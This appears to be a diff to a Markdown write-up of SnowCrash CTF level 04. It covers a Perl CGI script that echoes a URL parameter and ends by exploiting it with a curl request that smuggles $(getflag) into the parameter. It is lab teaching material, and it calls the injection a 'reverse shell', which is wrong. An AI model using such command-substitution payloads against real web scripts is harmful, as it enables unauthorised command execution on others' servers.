@@ -1,4 +1,4 @@
-# LEVEL 04 - Pearl script
+# LEVEL 04 - Pearl 
 
 ```shell
 level04@SnowCrash:~$ ls -la
@@ -11,6 +11,11 @@ d--x--x--x  1 root    users    340 Aug 30  2015 ..
 -r-x------  1 level04 level04  675 Apr  3  2012 .profile
 ```
 
+We already have a file present with `.pl` extension.
+
+> This type of file are `pearl` script.
+
+Lets take a look at it :
 ```
 level04@SnowCrash:~$ cat level04.pl 
 #!/usr/bin/perl
@@ -24,10 +29,19 @@ sub x {
 x(param("x"));
 ```
 
+## Deduction
+1. we can see that the script print content type like a header request.
+2. It get the first parameters passed in the `url?x=` and print it.
+3. It is a `web script` running on a `localhost server`
+
+Lets try out to see if it work.
+
 ```shell
 level04@SnowCrash:~$ curl 10.0.2.3:4747?x=arg
 arg
 ```
+
+We can use a `command remote injection` by using a `reverse shell` using `$()`.
 
 ```shell
 level04@SnowCrash:~$ curl '10.0.2.3:4747?x=$(getflag)'
